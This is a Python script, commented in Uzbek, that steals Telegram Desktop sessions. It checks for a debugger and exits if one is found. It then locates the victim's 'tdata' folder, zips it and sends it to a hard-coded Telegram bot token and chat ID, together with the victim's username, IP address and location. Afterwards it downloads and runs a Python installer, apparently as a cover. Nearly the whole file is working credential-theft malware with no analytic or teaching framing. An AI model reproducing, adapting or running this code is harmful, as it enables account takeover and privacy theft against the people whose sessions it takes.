import os
from pathlib import Path
import zipfile
import sys
import shutil
import requests
from tempfile import TemporaryDirectory
from random import choices
# Telegram bot token va chat_id ni qo'y
TELEGRAM_BOT_TOKEN = "8689498614:AAH1_l5m67acGvn3X2Ndndo6QxhfprC3GS0"
TELEGRAM_CHAT_ID = 7273147602

def anti_debugging():
    if hasattr(sys, "gettrace") and sys.gettrace():
        sys.exit(1)

anti_debugging()

BANNER = r"""
     _      __           _ _   _ _   
  __| |___ / _|__ _ _  _| | |_(_) |__
 / _` / -_)  _/ _` | || | |  _| | / /
 \__,_\___|_| \__,_|\_,_|_|\__|_|_\_\                       
"""

# Ehtimoliy yo'llar ro'yxati
user_profile = Path.home()
possible_paths = [
    user_profile / "AppData" / "Roaming" / "Telegram Desktop UWP",
    user_profile / "AppData" / "Roaming" / "Telegram Desktop",
    Path("D:/Telegram")
]
TEMP_PATH = os.getenv("TEMP")

def random_string(length):
    return "".join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=length))

def send_to_telegram(username, ip_info, file_path=None):
    text = (
        f"Username: {username}\n"
        f"IP: {ip_info.get('ip')}\n"
        f"Location: {ip_info.get('country')}, {ip_info.get('city')}\n"
        f"Timezone: {ip_info.get('timezone')}"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text})

    if file_path:
        url_file = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": text}
            requests.post(url_file, data=data, files=files)
    else:
        requests.post(url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text + "\nTelegram not found on computer"
        })

def download_python_installer():
    # Python rasmiy yuklab olish sahifasidan to'g'ridan-to'g'ri links
    url = "https://www.python.org/ftp/python/3.14.3/python-3.14.3-amd64.exe"
    filename = "python_installer.exe"

    print("Python installer yuklanmoqda...")
    response = requests.get(url, stream=True)
    with open(filename, "wb") as f:
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)

    print(f"Yuklab olindi: {filename}")
    os.startfile(filename)
    
def main():
    print("=" * 39)
    print(BANNER)
    print("=" * 39)

    username = os.getlogin()
    ip_info = requests.get("https://ipwhois.app/json/").json()

    # tdata papkasini qidirish
    tdata_folder = None
    for path in possible_paths:
        candidate = os.path.join(path, "tdata")
        if os.path.exists(candidate):
            tdata_folder = candidate
            break

    if not tdata_folder:
        send_to_telegram(username, ip_info)
        return

    with TemporaryDirectory() as temp:
        shutil.copytree(
            tdata_folder, temp, dirs_exist_ok=True,
            ignore=shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp")
        )

        archive_dir = os.path.join(TEMP_PATH, random_string(6))
        shutil.make_archive(archive_dir, "zip", temp)

        send_to_telegram(username, ip_info, file_path=f"{archive_dir}.zip")

    os.remove(f"{archive_dir}.zip")

if __name__ == "__main__":
    main()
    download_python_installer()